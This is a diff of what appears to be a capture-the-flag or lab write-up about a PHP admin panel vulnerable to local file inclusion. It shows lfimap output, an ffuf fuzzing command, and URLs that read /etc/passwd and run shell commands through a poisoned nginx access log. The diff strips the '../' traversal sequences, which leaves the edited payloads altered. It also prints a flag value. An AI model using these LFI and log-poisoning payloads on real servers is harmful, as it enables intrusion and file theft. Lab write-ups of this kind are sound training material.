@@ -126,7 +126,7 @@ Navigated to `http://IP:PORT/ilf_admin/index.php` and found Admin panel with log
 
 [!] Cookie argument ('-C') is not provided. lfimap might have troubles finding vulnerabilities if web app requires a cookie.
 
-[+] LFI -> 'http://142.93.40.191:31420/ilf_admin/index.php?log=../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd'
+[+] LFI -> 'http://142.93.40.191:31420/ilf_admin/index.php?log=etc/passwd'
 
 ----------------------------------------
 
@@ -142,7 +142,7 @@ LFI vuln used to find server logs `/var/log/nginx/access.log`, `/var/log/nginx/e
 
 ┌──(kali㉿kali)-[~]
 
-└─$ ffuf -ic -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-WordList-Linux:FUZZ -u http://IP:PORT/ilf_admin/index.php?log=../../../../../FUZZ -fs 2046
+└─$ ffuf -ic -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-WordList-Linux:FUZZ -u http://IP:PORT/ilf_admin/index.php?log=FUZZ -fs 2046
 
 <SNIP>
 
@@ -250,9 +250,9 @@ Connection: close
 
 Then got RCE by viewing the access logs:
 
-http://IP:PORT/ilf_admin/index.php?log=../../../../../var/log/nginx/access.log&cmd=cat /etc/passwd
+http://IP:PORT/ilf_admin/index.php?log=var/log/nginx/access.log&cmd=cat /etc/passwd
 
-http://IP:PORT/ilf_admin/index.php?log=../../../../../var/log/nginx/access.log&cmd=ls -la /
+http://IP:PORT/ilf_admin/index.php?log=var/log/nginx/access.log&cmd=ls -la /
 
 <SNIP>
 
@@ -298,7 +298,7 @@ drwxr-xr-x 1 root root 4096 Sep 9 2020 var
 
 ​
 
-http://IP:PORT/ilf_admin/index.php?log=../../../../../var/log/nginx/access.log&cmd=cat /flag_dacc60f2348d.txt
+http://IP:PORT/ilf_admin/index.php?log=var/log/nginx/access.log&cmd=cat /flag_dacc60f2348d.txt
 
 a9a892dbc9faf9a014f58e007721835e
 
